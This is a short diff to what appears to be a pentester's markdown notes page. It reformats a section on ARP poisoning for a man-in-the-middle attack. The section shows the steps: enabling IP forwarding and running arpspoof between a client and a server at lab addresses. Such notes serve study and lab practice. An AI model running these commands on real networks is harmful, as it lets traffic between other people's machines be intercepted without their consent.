@@ -32,8 +32,15 @@ tshark -i
 
 
 
-# ARP Poisoning / MITM attack
+
 # Here we deceive the client into thinking we are the server, and also deceive the server into thinking we are the client.
+```
+{% endcode %}
+
+### ARP Poisoning / MITM attack
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
 
 # step 1
 # discover host in the network.
@@ -47,13 +54,6 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # run the attack with arpspoof utility.
 # arpspoof -i <interface> -t <target_Client_IP> -r <target_Server_IP> # Perform an ARP spoofing attack
 arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
-
 ```
 {% endcode %}
-
-
-
-
-
-
 
